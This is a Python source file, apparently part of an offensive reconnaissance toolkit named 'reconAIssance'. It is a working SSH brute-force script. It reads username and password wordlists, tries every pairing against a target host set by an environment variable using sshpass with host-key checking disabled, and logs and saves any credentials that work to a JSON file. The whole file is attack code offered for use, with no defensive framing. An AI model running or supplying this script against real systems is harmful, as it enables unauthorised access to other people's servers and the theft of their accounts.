import os
import sys
import json
import subprocess
import logging
from pathlib import Path

# Logging Setup
logger = logging.getLogger("reconAIssance")
logger.setLevel(logging.DEBUG)
if not logger.hasHandlers():
    log_formatter = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
    file_handler = logging.FileHandler("recon_log.txt", mode='a')
    file_handler.setFormatter(log_formatter)
    logger.addHandler(file_handler)
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(log_formatter)
    logger.addHandler(console_handler)

sys.path.insert(0, os.path.abspath(os.path.join(os.getcwd(), "tools")))
from llm_wrapper import use_llm

LIMIT_USERS = 5000
LIMIT_PASSWORDS = 10000

def load(folder):
    logger.debug(f"Loading credentials from: {folder}/")
    out = []
    try:
        for file in os.listdir(folder):
            if file.endswith(".txt"):
                with open(os.path.join(folder, file), "r", encoding="utf-8", errors="ignore") as f:
                    lines = [l.strip() for l in f if l.strip()]
                    out += lines
        logger.info(f"Loaded {len(out)} entries from {folder}/")
    except Exception as e:
        logger.exception(f"Failed to load wordlist from {folder}/")
    return list(set(out))

def test_ssh(host, user, password):
    cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{host} whoami"
    try:
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=8)
        return user in result.stdout.decode()
    except Exception as e:
        logger.warning(f"SSH attempt failed for {user}:{password}")
        return False

def brute(target, path):
    logger.info(f"Starting fallback brute-force against: {target}")
    if not Path("UN").exists() or not Path("PW").exists():
        logger.error("Username or password directory missing (UN/ or PW/)")
        return

    users = load("UN")[:LIMIT_USERS]
    passwords = load("PW")[:LIMIT_PASSWORDS]
    combos = [(u, p) for u in users for p in passwords]
    total = len(combos)
    results = []
    out = os.path.join(path, "brute_fallback_result.json")

    logger.info(f"Testing {total} user/password combinations")

    try:
        for i, (u, p) in enumerate(combos, 1):
            ok = test_ssh(target, u, p)
            results.append({"user": u, "password": p, "success": ok})
            if ok:
                logger.info(f"[✓] SSH success: {u}:{p}")
            if i % 100 == 0 or ok:
                with open(out, "w") as f:
                    json.dump(results, f, indent=2)
            print(f"\rProgress: {i}/{total}", end="", flush=True)
    except KeyboardInterrupt:
        logger.warning("Brute-force interrupted by user")
        print("\n[!] Interrupted. Saving partial results...")
    except Exception as e:
        logger.exception("Unexpected error during brute-force")
    finally:
        with open(out, "w") as f:
            json.dump(results, f, indent=2)
        logger.info("Brute-force complete.")

if __name__ == "__main__":
    t = os.getenv("RECON_KI_TARGET")
    p = os.getenv("RECON_KI_RUN_PATH")
    if not t or not p:
        logger.error("Missing RECON_KI_TARGET or RECON_KI_RUN_PATH")
        exit(1)
    brute(t, p)